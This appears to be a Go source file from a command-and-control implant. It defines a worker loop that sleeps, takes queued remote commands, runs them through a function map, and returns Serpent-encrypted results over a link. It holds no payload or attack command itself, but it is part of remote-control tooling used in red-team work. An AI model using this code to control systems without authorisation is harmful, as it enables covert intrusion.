package internal

import (
	"strings"
	"time"
)

type Worker struct {
	Status     string // starting || idle || running || stopping
	Sleep      int    // seconds??
	Time       time.Time
	Link       *Link
	Rqueue     *SafeRequestQueue
	Cqueue     *SafeCommandQueue
	FuncPtrMap map[string]FuncPtr
}

func (w *Worker) Run() {
	w.Status = "starting"
	for w.Status != "stopping" {
		w.Status = "idle"
		w.Time = time.Now().UTC()
		time.Sleep(time.Duration(w.Sleep) * time.Second)
		if command := w.Cqueue.GetNext(); command != nil {
			w.Status = "running"
			w.Time = time.Now().UTC()
			cmd := strings.Fields(*command)
			op := cmd[0]
			args := cmd[1:]
			fp, exists := w.FuncPtrMap[op]
			if !exists {
				continue
			}
			ret, err := fp(args)
			if err != nil {
				encBytes, err := SerpentEncrypt([]byte(err.Error()), w.Link.Key)
				if err != nil {
					continue
				}
				newReq, err := w.Link.NewResultRequest(encBytes)
				if err != nil {
					continue
				}
				w.Rqueue.Add(newReq)
				continue
			}
			encBytes, err := SerpentEncrypt([]byte(ret), w.Link.Key)
			if err != nil {
				continue
			}
			newReq, err := w.Link.NewResultRequest(encBytes)
			if err != nil {
				continue
			}
			w.Rqueue.Add(newReq)
		}
	}
}
